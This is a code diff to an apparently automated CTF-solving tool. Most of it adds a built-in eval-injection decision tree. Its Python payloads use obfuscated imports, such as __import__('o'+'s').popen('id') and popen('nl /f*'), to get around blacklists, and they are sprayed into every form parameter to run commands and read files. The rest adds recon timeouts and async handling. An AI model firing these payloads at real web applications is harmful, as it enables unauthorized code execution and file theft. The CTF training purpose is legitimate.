@@ -9,13 +9,14 @@ from lattice_mind.core.unified_orchestrator which provides a single interface
 for both Python and YAML trees with shared SignalBus and ConfidencePool.
 """
 import logging
+import concurrent.futures
 from typing import List, Optional
 
 from lattice_mind.core.types import ChallengeDescriptor, ChallengeType
 from lattice_mind.core.orchestrator import Orchestrator
 from lattice_mind.core.flag_recognizer import get_flag_recognizer
 
-from lattice_mind.core.tree_loader import get_tree_registry
+from lattice_mind.core.tree_loader import DecisionTree, get_tree_registry
 from lattice_mind.core.confidence import ConfidencePool
 from lattice_mind.core.executor import TreeExecutor
 from lattice_mind.web.strategy_memory import (
@@ -42,9 +43,97 @@ class MVPSolver:
         import pathlib
         base_path = pathlib.Path(__file__).parent / "trees" / "yaml"
         self.registry.load_from_directory(str(base_path))
+        self._ensure_builtin_eval_tree()
         
         self.confidence_pool = ConfidencePool()
         self.executor = TreeExecutor(self.confidence_pool)
+
+    def _ensure_builtin_eval_tree(self) -> None:
+        """Register a baseline eval-injection tree when YAML packs omit it."""
+        if self.registry.get_tree("web_eval_injection"):
+            return
+        raw_tree = {
+            "id": "web_eval_injection",
+            "name": "Eval Injection",
+            "category": "web",
+            "version": "1.0",
+            "description": "Eval expression probing and blacklist-aware pivots.",
+            "enabled": True,
+            "tags": ["eval", "rce", "python"],
+            "applies_when": ["context.challenge.type == 'web'"],
+            "min_confidence": 0.05,
+            "stop_on_flag": True,
+            "confidence_seeds": [
+                {"condition": "any('python' in t for t in context.tech_stack)", "boost": 0.2, "label": "python_stack"}
+            ],
+            "detection_paths": [
+                {
+                    "id": "detect_eval_math",
+                    "name": "Eval arithmetic probe",
+                    "min_confidence": 0.05,
+                    "steps": [
+                        {
+                            "id": "eval_probe_math",
+                            "action": "http_request",
+                            "with": {
+                                "method": "GET",
+                                "request_source": "forms",
+                                "inject_into": "all_params",
+                                "payloads": ["7*6", "__import__('o'+'s').popen('id').read()"],
+                                "max_variants": 8,
+                            },
+                            "signals": [
+                                {
+                                    "name": "eval_exec_observed",
+                                    "match": "uid=|\\b42\\b",
+                                    "on_match": {"emit": "eval_exec_observed", "confidence_boost": 0.35},
+                                },
+                                {
+                                    "name": "blacklist_detected",
+                                    "match": "forbidden keyword",
+                                    "on_match": {"emit": "blacklist_detected", "confidence_boost": 0.2},
+                                },
+                            ],
+                        }
+                    ],
+                }
+            ],
+            "exploitation_paths": [
+                {
+                    "id": "exploit_eval_file_read",
+                    "name": "Eval file-read pivot",
+                    "requires_signal": "eval_exec_observed",
+                    "technique": "python_eval_rce",
+                    "steps": [
+                        {
+                            "id": "eval_exfil_attempt",
+                            "action": "http_request",
+                            "with": {
+                                "method": "GET",
+                                "request_source": "forms",
+                                "inject_into": "vulnerable_param",
+                                "payloads": [
+                                    "__import__('o'+'s').popen('nl /f*').read()",
+                                    "__import__('o'+'s').popen('id').read()",
+                                ],
+                                "max_variants": 10,
+                            },
+                            "capture": [
+                                {
+                                    "as": "flag_value",
+                                    "pattern": "(picoCTF\\{[^}]+\\}|flag\\{[^}]+\\}|ctf\\{[^}]+\\})",
+                                }
+                            ],
+                        }
+                    ],
+                }
+            ],
+        }
+        try:
+            self.registry.trees[raw_tree["id"]] = DecisionTree(raw_tree)
+            logger.info("[MVP] Registered builtin tree: web_eval_injection")
+        except Exception as e:
+            logger.warning("[MVP] Failed to register builtin eval tree: %s", e)
 
     def solve(
         self,
@@ -93,10 +182,17 @@ class MVPSolver:
         # confidence seeds are evaluated. Without this all seeds return 0 and
         # every YAML tree is skipped.
         if asset_type == ChallengeType.WEB:
+            recon_timeout_seconds = 30.0
             try:
-                self.orchestrator.run_tree(WebReconProbeNode())
+                with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
+                    future = pool.submit(self.orchestrator.run_tree, WebReconProbeNode())
+                    future.result(timeout=recon_timeout_seconds)
             except Exception as e:
                 logger.warning(f"[MVP] Web recon pre-pass failed: {e}")
+                context = self.orchestrator.execution_context
+                obs = context.setdefault("observations", {})
+                obs["recon_degraded"] = True
+                obs["recon_degraded_reason"] = str(e)
 
         
         # Set up progress callback for executor to match orchestrator flow
@@ -238,10 +334,14 @@ class MVPSolver:
 
         import asyncio
 
-        async def _normalize_exec_result(v):
-            if asyncio.iscoroutine(v):
-                return await v
-            return v
+        def _normalize_exec_result(v):
+            if not asyncio.iscoroutine(v):
+                return v
+            loop = asyncio.new_event_loop()
+            try:
+                return loop.run_until_complete(v)
+            finally:
+                loop.close()
 
         def _next_tree_id() -> str:
             return max(
@@ -260,7 +360,7 @@ class MVPSolver:
             logger.info(f"\n[MVP] Executing tree: {tree.id} (confidence: {current_score:.2f})")
 
             raw_result = self.executor.execute_tree(tree, context)
-            flag = asyncio.run(_normalize_exec_result(raw_result))
+            flag = _normalize_exec_result(raw_result)
             if flag:
                 self._record_strategy_memory(context, challenge, flag)
                 context["execution_plan"] = execution_plan
